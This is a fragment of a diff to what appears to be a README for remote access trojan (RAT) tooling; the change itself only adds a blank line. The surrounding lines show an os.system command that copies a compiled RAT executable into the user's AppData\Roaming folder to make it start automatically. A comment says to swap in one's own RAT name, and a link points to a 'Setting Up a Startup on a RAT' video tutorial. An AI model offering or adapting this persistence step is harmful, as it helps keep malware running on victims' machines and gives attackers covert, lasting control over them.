@@ -30,6 +30,7 @@ os.system('copy YOUR-COMPILED-RAT-NAME.exe "C:\Users\%username%\AppData\Roaming\
 #replace your rat name on 'YOUR-COMPILED-RAT-NAME.exe'
 ```
 Video Tutorial Setting Up a Startup on a RAT: [Watch]()
+
 -------------------------------
 Logo:
 
